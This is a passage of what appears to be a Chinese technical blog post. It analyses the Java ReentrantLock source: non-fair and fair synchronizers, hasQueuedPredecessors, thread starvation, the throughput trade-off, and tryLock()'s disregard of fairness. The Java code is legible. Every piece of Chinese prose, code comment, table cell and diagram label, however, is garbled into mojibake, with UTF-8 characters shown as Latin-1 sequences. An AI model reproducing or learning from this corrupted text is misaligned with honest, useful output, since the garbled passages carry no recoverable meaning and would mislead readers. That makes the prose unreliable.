<p>è¿™ä¸ªæ–¹æ³•è¢«<code>Condition</code>ä½¿ç”¨ï¼Œç”¨äºåœ¨<code>await()</code>å’Œ<code>signal()</code>æ—¶æ£€æŸ¥å½“å‰çº¿ç¨‹æ˜¯å¦æŒæœ‰é”ã€‚</p>
<h4 data-id="heading-72">2.5 è¾…åŠ©æ–¹æ³•</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// è·å–é”çš„æŒæœ‰è€…</span>
<span class="hljs-keyword">final</span> Thread <span class="hljs-title function_">getOwner</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">return</span> getState() == <span class="hljs-number">0</span> ? <span class="hljs-literal">null</span> : getExclusiveOwnerThread();
}

<span class="hljs-comment">// è·å–å½“å‰çº¿ç¨‹çš„é‡å…¥æ¬¡æ•°</span>
<span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getHoldCount</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">return</span> isHeldExclusively() ? getState() : <span class="hljs-number">0</span>;
}

<span class="hljs-comment">// åˆ¤æ–­é”æ˜¯å¦è¢«ä»»ä½•çº¿ç¨‹æŒæœ‰</span>
<span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isLocked</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">return</span> getState() != <span class="hljs-number">0</span>;
}

<span class="hljs-comment">// åˆ›å»ºæ¡ä»¶å˜é‡</span>
<span class="hljs-keyword">final</span> ConditionObject <span class="hljs-title function_">newCondition</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConditionObject</span>();
}
</code></pre>
<hr/>
<h3 data-id="heading-73">3. éå…¬å¹³é”NonfairSync</h3>
<h4 data-id="heading-74">3.1 å®Œæ•´æºç </h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * éå…¬å¹³é”çš„åŒæ­¥å™¨
 */</span>
<span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">NonfairSync</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Sync</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">7316153563782823691L</span>;

    <span class="hljs-comment">/**
     * è·å–é”
     * éå…¬å¹³é”çš„ç‰¹ç‚¹ï¼šå…ˆå°è¯•æ’é˜Ÿï¼Œå¤±è´¥å†æ’é˜Ÿ
     */</span>
    <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">lock</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// â‘  ç›´æ¥å°è¯•CASè·å–é”ï¼ˆæ’é˜Ÿï¼‰</span>
        <span class="hljs-keyword">if</span> (compareAndSetState(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>))
            setExclusiveOwnerThread(Thread.currentThread());
        <span class="hljs-keyword">else</span>
            <span class="hljs-comment">// â‘¡ æ’é˜Ÿå¤±è´¥ï¼Œèµ°æ ‡å‡†è·å–æµç¨‹</span>
            acquire(<span class="hljs-number">1</span>);
    }

    <span class="hljs-comment">/**
     * å°è¯•è·å–é”ï¼ˆéå…¬å¹³ç‰ˆæœ¬ï¼‰
     */</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryAcquire</span><span class="hljs-params">(<span class="hljs-type">int</span> acquires)</span> {
        <span class="hljs-keyword">return</span> nonfairTryAcquire(acquires);
    }
}
</code></pre>
<h4 data-id="heading-75">3.2 éå…¬å¹³é”çš„"æ’é˜Ÿ"æœºåˆ¶</h4>
<p>éå…¬å¹³é”æœ‰<strong>ä¸¤æ¬¡æ’é˜Ÿæœºä¼š</strong>ï¼š</p>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant T as æ–°çº¿ç¨‹
    participant AQS as AQS
    participant Q as ç­‰å¾…é˜Ÿåˆ—
    
    Note over T: è°ƒç”¨lock()
    
    T-&gt;&gt;AQS: â‘  ç¬¬ä¸€æ¬¡æ’é˜Ÿï¼šCAS(0-&gt;1)
    alt CASæˆåŠŸ
        AQS--&gt;&gt;T: è·å–æˆåŠŸï¼ˆæ’é˜ŸæˆåŠŸï¼‰
    else CASå¤±è´¥
        T-&gt;&gt;AQS: acquire(1)
        T-&gt;&gt;AQS: â‘¡ ç¬¬äºŒæ¬¡æ’é˜Ÿï¼štryAcquire
        alt tryAcquireæˆåŠŸ
            AQS--&gt;&gt;T: è·å–æˆåŠŸï¼ˆæ’é˜ŸæˆåŠŸï¼‰
        else tryAcquireå¤±è´¥
            T-&gt;&gt;Q: å…¥é˜Ÿç­‰å¾…
            Note over T: è€å®æ’é˜Ÿ
        end
    end
</code></pre>
<p><strong>ç¬¬ä¸€æ¬¡æ’é˜Ÿ</strong>ï¼šåœ¨<code>lock()</code>æ–¹æ³•ä¸­ç›´æ¥CAS</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">if</span> (compareAndSetState(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>))
    setExclusiveOwnerThread(Thread.currentThread());
</code></pre>
<p><strong>ç¬¬äºŒæ¬¡æ’é˜Ÿ</strong>ï¼šåœ¨<code>acquire()</code>ä¸­è°ƒç”¨<code>tryAcquire()</code></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// AQS.acquire</span>
<span class="hljs-keyword">if</span> (!tryAcquire(arg) &amp;&amp; ...)
</code></pre>
<p>è¿™å°±æ˜¯ä¸ºä»€ä¹ˆéå…¬å¹³é”å¯èƒ½å¯¼è‡´ç­‰å¾…çº¿ç¨‹"é¥¥é¥¿"â€”â€”æ–°æ¥çš„çº¿ç¨‹å¯èƒ½æŠ¢åœ¨ç­‰å¾…é˜Ÿåˆ—å‰é¢è·å–é”ã€‚</p>
<hr/>
<h4 data-id="heading-76">3.3 éå…¬å¹³é”çš„é¥¥é¥¿é—®é¢˜</h4>
<h5 data-id="heading-77">3.3.1 ä»€ä¹ˆæ˜¯çº¿ç¨‹é¥¥é¥¿</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * éå…¬å¹³é”å¯èƒ½å¯¼è‡´çº¿ç¨‹é¥¥é¥¿
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ThreadStarvation</span> {
    
    <span class="hljs-comment">// éå…¬å¹³é”ï¼ˆé»˜è®¤ï¼‰</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">unfairLock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>(<span class="hljs-literal">false</span>);
    
    <span class="hljs-comment">/**
     * åœºæ™¯ï¼šçº¿ç¨‹AæŒæœ‰é”å¾ˆé•¿æ—¶é—´
     * çº¿ç¨‹Bã€Cã€D...éƒ½åœ¨ç­‰å¾…
     * çº¿ç¨‹Aé‡Šæ”¾åï¼Œå¦‚æœæ–°æ¥çš„çº¿ç¨‹EæŠ¢åˆ°äº†é”
     * Bã€Cã€Dç»§ç»­ç­‰å¾…...
     * 
     * æç«¯æƒ…å†µä¸‹ï¼ŒBå¯èƒ½ä¸€ç›´è·å–ä¸åˆ°é”
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">potentialStarvation</span><span class="hljs-params">()</span> {
        unfairLock.lock();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// é•¿æ—¶é—´æ“ä½œ</span>
            Thread.sleep(<span class="hljs-number">1000</span>);
        } <span class="hljs-keyword">catch</span> (InterruptedException e) {
            Thread.currentThread().interrupt();
        } <span class="hljs-keyword">finally</span> {
            unfairLock.unlock();
        }
    }
}
</code></pre>
<h5 data-id="heading-78">3.3.2 å¦‚ä½•è§£å†³é¥¥é¥¿é—®é¢˜</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * è§£å†³é¥¥é¥¿é—®é¢˜çš„æ–¹æ¡ˆ
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StarvationSolution</span> {
    
    <span class="hljs-comment">// æ–¹æ¡ˆ1ï¼šä½¿ç”¨å…¬å¹³é”</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">fairLock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>(<span class="hljs-literal">true</span>);
    
    <span class="hljs-comment">// æ–¹æ¡ˆ2ï¼šå‡å°‘é”æŒæœ‰æ—¶é—´</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">reduceHoldTime</span><span class="hljs-params">()</span> {
        lock.lock();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// åªåšå¿…è¦æ“ä½œ</span>
            quickOperation();
        } <span class="hljs-keyword">finally</span> {
            lock.unlock();
        }
        <span class="hljs-comment">// è€—æ—¶æ“ä½œæ”¾åœ¨é”å¤–</span>
        slowOperation();
    }
    
    <span class="hljs-comment">// æ–¹æ¡ˆ3ï¼šä½¿ç”¨tryLockè¶…æ—¶</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">withTimeout</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-keyword">if</span> (lock.tryLock(<span class="hljs-number">100</span>, TimeUnit.MILLISECONDS)) {
                <span class="hljs-keyword">try</span> {
                    <span class="hljs-comment">// ä¸šåŠ¡é€»è¾‘</span>
                } <span class="hljs-keyword">finally</span> {
                    lock.unlock();
                }
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-comment">// è¶…æ—¶å¤„ç†ï¼Œè€Œä¸æ˜¯æ— é™ç­‰å¾…</span>
                handleTimeout();
            }
        } <span class="hljs-keyword">catch</span> (InterruptedException e) {
            Thread.currentThread().interrupt();
        }
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">quickOperation</span><span class="hljs-params">()</span> {}
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">slowOperation</span><span class="hljs-params">()</span> {}
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleTimeout</span><span class="hljs-params">()</span> {}
}
</code></pre>
<h5 data-id="heading-79">3.3.3 ä¸ºä»€ä¹ˆè¿˜è¦ä½¿ç”¨éå…¬å¹³é”</h5>
<p>å°½ç®¡å¯èƒ½é€ æˆé¥¥é¥¿ï¼Œéå…¬å¹³é”ä»æ˜¯é»˜è®¤é€‰æ‹©ï¼š</p>






























<table><thead><tr><th align="left">æ–¹é¢</th><th align="left">å…¬å¹³é”</th><th align="left">éå…¬å¹³é”</th></tr></thead><tbody><tr><td align="left">çº¿ç¨‹é¥¥é¥¿</td><td align="left">ä¸ä¼š</td><td align="left">å¯èƒ½</td></tr><tr><td align="left">ååé‡</td><td align="left">è¾ƒä½</td><td align="left">è¾ƒé«˜</td></tr><tr><td align="left">ä¸Šä¸‹æ–‡åˆ‡æ¢</td><td align="left">å¤š</td><td align="left">å°‘</td></tr><tr><td align="left">é€‚ç”¨åœºæ™¯</td><td align="left">é¡ºåºé‡è¦</td><td align="left">æ€§èƒ½é‡è¦</td></tr></tbody></table>
<p><strong>å¤§å¤šæ•°åœºæ™¯ä¸‹</strong>ï¼Œé¥¥é¥¿é—®é¢˜å‘ç”Ÿçš„æ¦‚ç‡å¾ˆä½ï¼Œéå…¬å¹³é”çš„æ€§èƒ½ä¼˜åŠ¿æ›´é‡è¦ã€‚</p>
<h3 data-id="heading-80">4. å…¬å¹³é”FairSync</h3>
<h4 data-id="heading-81">4.1 å®Œæ•´æºç </h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * å…¬å¹³é”çš„åŒæ­¥å™¨
 */</span>
<span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FairSync</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Sync</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> -<span class="hljs-number">3000897897090466540L</span>;

    <span class="hljs-comment">/**
     * è·å–é”
     * å…¬å¹³é”çš„ç‰¹ç‚¹ï¼šä¸æ’é˜Ÿï¼Œç›´æ¥èµ°æ ‡å‡†æµç¨‹
     */</span>
    <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">lock</span><span class="hljs-params">()</span> {
        acquire(<span class="hljs-number">1</span>);  <span class="hljs-comment">// æ²¡æœ‰æ’é˜Ÿï¼Œç›´æ¥acquire</span>
    }

    <span class="hljs-comment">/**
     * å°è¯•è·å–é”ï¼ˆå…¬å¹³ç‰ˆæœ¬ï¼‰
     * ä¸éå…¬å¹³ç‰ˆæœ¬çš„å”¯ä¸€åŒºåˆ«ï¼šæ£€æŸ¥æ˜¯å¦æœ‰å‰é©±ç­‰å¾…è€…
     */</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryAcquire</span><span class="hljs-params">(<span class="hljs-type">int</span> acquires)</span> {
        <span class="hljs-keyword">final</span> <span class="hljs-type">Thread</span> <span class="hljs-variable">current</span> <span class="hljs-operator">=</span> Thread.currentThread();
        <span class="hljs-type">int</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> getState();
        
        <span class="hljs-keyword">if</span> (c == <span class="hljs-number">0</span>) {
            <span class="hljs-comment">// å…³é”®åŒºåˆ«ï¼šå…ˆæ£€æŸ¥é˜Ÿåˆ—ä¸­æ˜¯å¦æœ‰ç­‰å¾…è€…</span>
            <span class="hljs-keyword">if</span> (!hasQueuedPredecessors() &amp;&amp;
                compareAndSetState(<span class="hljs-number">0</span>, acquires)) {
                setExclusiveOwnerThread(current);
                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
            }
        }
        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (current == getExclusiveOwnerThread()) {
            <span class="hljs-comment">// é‡å…¥é€»è¾‘ä¸éå…¬å¹³é”ç›¸åŒ</span>
            <span class="hljs-type">int</span> <span class="hljs-variable">nextc</span> <span class="hljs-operator">=</span> c + acquires;
            <span class="hljs-keyword">if</span> (nextc &lt; <span class="hljs-number">0</span>)
                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">"Maximum lock count exceeded"</span>);
            setState(nextc);
            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
        }
        
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    }
}
</code></pre>
<h4 data-id="heading-82">4.2 hasQueuedPredecessors - æ£€æŸ¥å‰é©±ç­‰å¾…è€…</h4>
<p>è¿™æ˜¯å…¬å¹³é”çš„æ ¸å¿ƒæ–¹æ³•ï¼Œåˆ¤æ–­å½“å‰çº¿ç¨‹æ˜¯å¦éœ€è¦æ’é˜Ÿï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * æŸ¥è¯¢æ˜¯å¦æœ‰çº¿ç¨‹æ¯”å½“å‰çº¿ç¨‹ç­‰å¾…æ›´ä¹…
 * <span class="hljs-doctag">@return</span> trueè¡¨ç¤ºæœ‰å‰é©±ç­‰å¾…è€…ï¼Œå½“å‰çº¿ç¨‹éœ€è¦æ’é˜Ÿ
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">hasQueuedPredecessors</span><span class="hljs-params">()</span> {
    <span class="hljs-type">Node</span> <span class="hljs-variable">t</span> <span class="hljs-operator">=</span> tail;
    <span class="hljs-type">Node</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> head;
    Node s;
    <span class="hljs-keyword">return</span> h != t &amp;&amp;
        ((s = h.next) == <span class="hljs-literal">null</span> || s.thread != Thread.currentThread());
}
</code></pre>
<p><strong>é€»è¾‘è§£æ</strong>ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c675a23e1b624f40934050318c0f9b54~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ZWc6Iqx5rC05pyIbGlueWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767298&amp;x-signature=CaePWKjVxZ211VGTWJNBiz9Y8pk%3D" alt="hasQueuedPredecessors-flow.drawio.png" loading="lazy"/></p>
<p><strong>è¿”å›trueçš„æƒ…å†µ</strong>ï¼ˆéœ€è¦æ’é˜Ÿï¼‰ï¼š</p>
<ol>
<li>é˜Ÿåˆ—ä¸ä¸ºç©ºï¼Œä¸”æœ‰å…¶ä»–çº¿ç¨‹åœ¨ç­‰å¾…</li>
<li>é˜Ÿåˆ—æ­£åœ¨åˆå§‹åŒ–ï¼ˆhead.nextä¸ºnullï¼‰</li>
</ol>
<p><strong>è¿”å›falseçš„æƒ…å†µ</strong>ï¼ˆå¯ä»¥å°è¯•è·å–ï¼‰ï¼š</p>
<ol>
<li>é˜Ÿåˆ—ä¸ºç©º</li>
<li>å½“å‰çº¿ç¨‹å°±æ˜¯ç¬¬ä¸€ä¸ªç­‰å¾…è€…</li>
</ol>
<hr/>
<h3 data-id="heading-83">5. å…¬å¹³é”vséå…¬å¹³é”å¯¹æ¯”</h3>
<h4 data-id="heading-84">5.1 ä»£ç å·®å¼‚</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ============ éå…¬å¹³é” ============</span>
<span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">NonfairSync</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Sync</span> {
    
    <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">lock</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// å·®å¼‚1ï¼šç›´æ¥å°è¯•CASæ’é˜Ÿ</span>
        <span class="hljs-keyword">if</span> (compareAndSetState(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>))
            setExclusiveOwnerThread(Thread.currentThread());
        <span class="hljs-keyword">else</span>
            acquire(<span class="hljs-number">1</span>);
    }

    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryAcquire</span><span class="hljs-params">(<span class="hljs-type">int</span> acquires)</span> {
        <span class="hljs-comment">// å·®å¼‚2ï¼šä¸æ£€æŸ¥é˜Ÿåˆ—ï¼Œç›´æ¥å°è¯•è·å–</span>
        <span class="hljs-keyword">return</span> nonfairTryAcquire(acquires);
    }
}

<span class="hljs-comment">// ============ å…¬å¹³é” ============</span>
<span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FairSync</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Sync</span> {
    
    <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">lock</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// å·®å¼‚1ï¼šæ²¡æœ‰æ’é˜Ÿï¼Œç›´æ¥acquire</span>
        acquire(<span class="hljs-number">1</span>);
    }

    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryAcquire</span><span class="hljs-params">(<span class="hljs-type">int</span> acquires)</span> {
        <span class="hljs-comment">// ...</span>
        <span class="hljs-keyword">if</span> (c == <span class="hljs-number">0</span>) {
            <span class="hljs-comment">// å·®å¼‚2ï¼šå…ˆæ£€æŸ¥æ˜¯å¦æœ‰ç­‰å¾…è€…</span>
            <span class="hljs-keyword">if</span> (!hasQueuedPredecessors() &amp;&amp; 
                compareAndSetState(<span class="hljs-number">0</span>, acquires)) {
                <span class="hljs-comment">// ...</span>
            }
        }
        <span class="hljs-comment">// ...</span>
    }
}
</code></pre>
<h4 data-id="heading-85">5.2 è¡Œä¸ºå¯¹æ¯”</h4>








































<table><thead><tr><th align="left">æ–¹é¢</th><th align="left">éå…¬å¹³é”</th><th align="left">å…¬å¹³é”</th></tr></thead><tbody><tr><td align="left">lock()é¦–æ¬¡å°è¯•</td><td align="left">CASæ’é˜Ÿ</td><td align="left">ç›´æ¥acquire</td></tr><tr><td align="left">tryAcquireæ£€æŸ¥</td><td align="left">ä¸æ£€æŸ¥é˜Ÿåˆ—</td><td align="left">æ£€æŸ¥hasQueuedPredecessors</td></tr><tr><td align="left">æ’é˜Ÿæœºä¼š</td><td align="left">2æ¬¡</td><td align="left">0æ¬¡</td></tr><tr><td align="left">é¥¥é¥¿å¯èƒ½</td><td align="left">æœ‰</td><td align="left">æ— </td></tr><tr><td align="left">ååé‡</td><td align="left">é«˜</td><td align="left">ä½</td></tr><tr><td align="left">çº¿ç¨‹åˆ‡æ¢</td><td align="left">å°‘</td><td align="left">å¤š</td></tr></tbody></table>
<h4 data-id="heading-86">5.3 æ€§èƒ½å·®å¼‚åˆ†æ</h4>
<p><strong>éå…¬å¹³é”æ›´å¿«çš„åŸå› </strong>ï¼š</p>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant T1 as çº¿ç¨‹1(æŒæœ‰é”)
    participant T2 as çº¿ç¨‹2(ç­‰å¾…ä¸­)
    participant T3 as çº¿ç¨‹3(æ–°æ¥çš„)
    
    Note over T1,T3: éå…¬å¹³é”åœºæ™¯
    T1-&gt;&gt;T1: é‡Šæ”¾é”
    T1-&gt;&gt;T2: unpark(T2)
    Note over T2: å”¤é†’ä¸­...
    T3-&gt;&gt;T3: lock() - CASæˆåŠŸ
    Note over T3: T3æ’é˜Ÿè·å–é”
    Note over T2: å”¤é†’åå‘ç°é”æ²¡äº†
    Note over T2: ç»§ç»­ç­‰å¾…
    
    Note over T1,T3: æ€»ç»“ï¼šT3ä¸éœ€è¦ä¸Šä¸‹æ–‡åˆ‡æ¢
</code></pre>
<p><strong>éå…¬å¹³é”å‡å°‘çš„å¼€é”€</strong>ï¼š</p>
<ol>
<li>å‡å°‘çº¿ç¨‹åˆ‡æ¢æ¬¡æ•°</li>
<li>é¿å…"åˆšå”¤é†’å°±è¦ç¡çœ "çš„æƒ…å†µ</li>
<li>æé«˜CPUç¼“å­˜å‘½ä¸­ç‡</li>
</ol>
<p><strong>å…¬å¹³é”æ›´æ…¢çš„åŸå› </strong>ï¼š</p>
<ol>
<li>æ¯æ¬¡è·å–é”éƒ½è¦æ£€æŸ¥é˜Ÿåˆ—</li>
<li>å¿…é¡»ä¸¥æ ¼æŒ‰é¡ºåºå”¤é†’</li>
<li>æ›´å¤šçš„çº¿ç¨‹åˆ‡æ¢</li>
</ol>
<h4 data-id="heading-87">5.4 é€‰æ‹©å»ºè®®</h4>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2b68aeab0e674a50af3438a750ae5c83~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ZWc6Iqx5rC05pyIbGlueWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767298&amp;x-signature=jLPUQHVyR7H0O%2FNbApkr23yH6W4%3D" alt="lock-type-selection.drawio.png" loading="lazy"/></p>
<p><strong>ä½¿ç”¨éå…¬å¹³é”çš„åœºæ™¯</strong>ï¼ˆé»˜è®¤ï¼‰ï¼š</p>
<ul>
<li>å¤§å¤šæ•°ä¸šåŠ¡åœºæ™¯</li>
<li>è¿½æ±‚é«˜ååé‡</li>
<li>é”æŒæœ‰æ—¶é—´çŸ­</li>
</ul>
<p><strong>ä½¿ç”¨å…¬å¹³é”çš„åœºæ™¯</strong>ï¼š</p>
<ul>
<li>ä¸¥æ ¼è¦æ±‚æŒ‰é¡ºåºå¤„ç†</li>
<li>é¿å…çº¿ç¨‹é¥¥é¥¿</li>
<li>å…¬å¹³æ€§æ¯”æ€§èƒ½æ›´é‡è¦</li>
</ul>
<hr/>
<h4 data-id="heading-88">5.5 tryLockåœ¨å…¬å¹³/éå…¬å¹³é”ä¸­çš„è¡Œä¸º</h4>
<h5 data-id="heading-89">5.5.1 å…³é”®åŒºåˆ«</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * tryLock()åœ¨å…¬å¹³é”å’Œéå…¬å¹³é”ä¸­çš„è¡Œä¸ºå·®å¼‚
 * 
 * ã€é‡è¦ã€‘tryLock()ä¸éµå¾ªå…¬å¹³æ€§ï¼
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TryLockBehavior</span> {
    
    <span class="hljs-comment">// å…¬å¹³é”</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">fairLock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>(<span class="hljs-literal">true</span>);
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">demonstrateTryLock</span><span class="hljs-params">()</span> {
        
        <span class="hljs-comment">// lock()æ–¹æ³•éµå¾ªå…¬å¹³æ€§</span>
        <span class="hljs-comment">// å…¬å¹³é”ï¼šæ£€æŸ¥é˜Ÿåˆ—ï¼Œæœ‰ç­‰å¾…è€…åˆ™ä¸æ’é˜Ÿ</span>
        <span class="hljs-comment">// éå…¬å¹³é”ï¼šç›´æ¥å°è¯•è·å–</span>
        
        <span class="hljs-comment">// tryLock()æ–¹æ³•ã€ä¸éµå¾ªå…¬å¹³æ€§ã€‘ï¼</span>
        <span class="hljs-comment">// å³ä½¿æ˜¯å…¬å¹³é”ï¼ŒtryLock()ä¹Ÿä¼šç›´æ¥å°è¯•è·å–ï¼Œä¸æ£€æŸ¥é˜Ÿåˆ—ï¼</span>
        <span class="hljs-keyword">if</span> (fairLock.tryLock()) {  <span class="hljs-comment">// æ’é˜Ÿè·å–ï¼Œä¸ç®¡é˜Ÿåˆ—ä¸­æ˜¯å¦æœ‰ç­‰å¾…è€…</span>
            <span class="hljs-keyword">try</span> {
                <span class="hljs-comment">// ...</span>
            } <span class="hljs-keyword">finally</span> {
                fairLock.unlock();
            }
        }
        
        <span class="hljs-comment">// å¦‚æœéœ€è¦å…¬å¹³çš„tryLockï¼Œä½¿ç”¨å¸¦è¶…æ—¶çš„ç‰ˆæœ¬ï¼š</span>
        <span class="hljs-comment">// tryLock(0, TimeUnit.SECONDS) ä¼šéµå¾ªå…¬å¹³æ€§ï¼</span>
    }
}
</code></pre>
<h5 data-id="heading-90">5.5.2 æºç åˆ†æ</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ReentrantLock.tryLock() æºç </span>
<span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryLock</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">return</span> sync.nonfairTryAcquire(<span class="hljs-number">1</span>);  <span class="hljs-comment">// ã€æ³¨æ„ã€‘è°ƒç”¨çš„æ˜¯nonfairTryAcquireï¼</span>
}

<span class="hljs-comment">// ReentrantLock.tryLock(timeout, unit) æºç </span>
<span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryLock</span><span class="hljs-params">(<span class="hljs-type">long</span> timeout, TimeUnit unit)</span> <span class="hljs-keyword">throws</span> InterruptedException {
    <span class="hljs-keyword">return</span> sync.tryAcquireNanos(<span class="hljs-number">1</span>, unit.toNanos(timeout));  <span class="hljs-comment">// è¿™ä¸ªä¼šæ£€æŸ¥å…¬å¹³æ€§</span>
}
</code></pre>
<p><strong>ä¸ºä»€ä¹ˆtryLock()ä¸éµå¾ªå…¬å¹³æ€§ï¼Ÿ</strong></p>
<ul>
<li><strong>è®¾è®¡æ„å›¾</strong>ï¼štryLock()æ˜¯"å°è¯•è·å–"ï¼Œå¦‚æœè¦æ’é˜Ÿé‚£å°±ä¸æ˜¯"å°è¯•"äº†</li>
<li><strong>æ€§èƒ½è€ƒè™‘</strong>ï¼šæ£€æŸ¥é˜Ÿåˆ—éœ€è¦é¢å¤–å¼€é”€</li>
<li><strong>ä½¿ç”¨åœºæ™¯</strong>ï¼šé€šå¸¸ç”¨äº"èƒ½è·å–å°±è·å–ï¼Œä¸èƒ½å°±ç®—äº†"çš„åœºæ™¯</li>
</ul>
<h3 data-id="heading-91">6. å¯é‡å…¥æœºåˆ¶è¯¦è§£</h3>
<h4 data-id="heading-92">6.1 ä»€ä¹ˆæ˜¯å¯é‡å…¥</h4>
